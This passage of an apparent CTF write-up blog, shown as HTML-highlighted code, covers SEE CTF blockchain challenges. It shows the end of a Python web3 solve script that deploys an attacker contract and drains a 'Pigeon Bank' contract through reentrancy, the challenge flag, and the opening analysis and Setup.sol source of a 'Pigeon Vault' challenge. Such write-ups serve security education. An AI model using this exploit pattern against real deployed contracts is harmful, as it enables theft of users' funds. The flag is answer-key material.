</span></span><span class="line"><span class="cl"><span class="n">setup_abi</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;payable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;constructor&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;isSolved&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;peth&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract PETH&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;pigeonBank&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract PigeonBank&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">}]</span>
</span></span><span class="line"><span class="cl"><span class="n">setup_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">setup_address</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">setup_abi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">selector</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">keccak</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;peth()&#39;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">call</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;to&#39;</span><span class="p">:</span> <span class="n">setup_address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="n">selector</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">peth_address</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">12</span><span class="p">:]</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">peth_address</span> <span class="si">= }</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">peth_address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get pigeonBank address</span>
</span></span><span class="line"><span class="cl"><span class="n">selector</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">keccak</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;pigeonBank()&#39;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">call</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;to&#39;</span><span class="p">:</span> <span class="n">setup_address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="n">selector</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">pigeon_bank_address</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">12</span><span class="p">:]</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">pigeon_bank_address</span> <span class="si">= }</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">pigeon_bank_address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Deploy attacker contract</span>
</span></span><span class="line"><span class="cl"><span class="n">compiled_src</span> <span class="o">=</span> <span class="n">compile_files</span><span class="p">([</span><span class="s1">&#39;Attacker.sol&#39;</span><span class="p">],</span> <span class="n">output_values</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;abi&#39;</span><span class="p">,</span> <span class="s1">&#39;bin&#39;</span><span class="p">],</span> <span class="n">import_remappings</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;@openzeppelin/=../lib/openzeppelin-contracts/&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">compiled_attacker</span> <span class="o">=</span> <span class="n">compiled_src</span><span class="p">[</span><span class="s1">&#39;Attacker.sol:Attacker&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">attacker_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">abi</span><span class="o">=</span><span class="n">compiled_attacker</span><span class="p">[</span><span class="s1">&#39;abi&#39;</span><span class="p">],</span> <span class="n">bytecode</span><span class="o">=</span><span class="n">compiled_attacker</span><span class="p">[</span><span class="s1">&#39;bin&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">attacker_contract</span><span class="o">.</span><span class="n">constructor</span><span class="p">(</span><span class="n">peth_address</span><span class="p">,</span> <span class="n">pigeon_bank_address</span><span class="p">)</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;from&#34;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;value&#34;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_wei</span><span class="p">(</span><span class="mf">9.5</span><span class="p">,</span> <span class="s1">&#39;ether&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rcpt</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_receipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">attacker_address</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="n">rcpt</span><span class="p">[</span><span class="s1">&#39;contractAddress&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">attacker_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">attacker_address</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">compiled_attacker</span><span class="p">[</span><span class="s1">&#39;abi&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">attacker_address</span> <span class="si">= }</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">attacker_address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call setAllowance</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">attacker_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">setAllowance</span><span class="p">()</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call attack</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">attacker_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">attack</span><span class="p">()</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;player balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">get_flag</span><span class="p">(</span><span class="n">uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>Flag: SEE{N0t_4n0th3r_r33ntr4ncY_4tt4ck_abb0acf50139ba1e468f363f96bc5a24}</strong></p>
</blockquote>
<h2 id="pigeon-vault">Pigeon Vault</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>rainbowpigeon has just received a massive payout from his secret business, and he now wants to create a secure vault to store his cryptocurrency assets. To achieve this, he developed PigeonVault, and being a smart guy, he made provisions for upgrading the contract in case he detects any vulnerability in the system.</p>
<p>Find out a way to steal his funds before he discovers any flaws in his implementation.</p>
<p>Blockchain has a block time of 10: <a href="https://book.getfoundry.sh/reference/anvil/" target="_blank" rel="noopener noreffer ">https://book.getfoundry.sh/reference/anvil/</a></p>
</div>
        </div>
    </div>
<h3 id="initial-analysis-3">Initial Analysis</h3>
<p>In this challenge, we were given a lot of solidity files. After skimming through some of the code, I observed that the code is trying to follow the diamonds multi facets pattern. This <a href="https://eips.ethereum.org/EIPS/eip-2535" target="_blank" rel="noopener noreffer ">link</a> explained the concept pretty well. Let&rsquo;s try to check some of the important file.</p>
<p><strong>Setup.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IDiamondCut</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IDiamondCut.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IDiamondLoupe</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IDiamondLoupe.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IOwnershipFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IOwnershipFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./interfaces/IERC20.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">DiamondCutFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/DiamondCutFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">OwnershipFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/OwnershipFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">DiamondLoupeFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/DiamondLoupeFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">FeatherCoinFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/FTCFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">DAOFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/DAOFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">PigeonVaultFacet</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./facets/PigeonVaultFacet.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">PigeonDiamond</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./PigeonDiamond.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">InitDiamond</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./InitDiamond.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">DiamondCutFacet</span> <span class="k">public</span> <span class="n">diamondCutFacet</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">OwnershipFacet</span> <span class="k">public</span> <span class="n">ownershipFacet</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DiamondLoupeFacet</span> <span class="k">public</span> <span class="n">diamondLoupeFacet</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">FeatherCoinFacet</span> <span class="k">public</span> <span class="n">ftcFacet</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DAOFacet</span> <span class="k">public</span> <span class="n">daoFacet</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PigeonVaultFacet</span> <span class="k">public</span> <span class="n">pigeonVaultFacet</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">PigeonDiamond</span> <span class="k">public</span> <span class="n">pigeonDiamond</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">InitDiamond</span> <span class="k">public</span> <span class="n">initDiamond</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="k">public</span> <span class="n">claimed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">diamondCutFacet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DiamondCutFacet</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">ownershipFacet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">OwnershipFacet</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">diamondLoupeFacet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DiamondLoupeFacet</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">ftcFacet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FeatherCoinFacet</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">daoFacet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DAOFacet</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">pigeonVaultFacet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PigeonVaultFacet</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">pigeonDiamond</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PigeonDiamond</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">diamondCutFacet</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">initDiamond</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitDiamond</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">diamondCut</span> <span class="o">=</span> <span class="k">new</span> <span class="n">IDiamondCut</span><span class="p">.</span><span class="n">FacetCut</span><span class="p">[](</span><span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
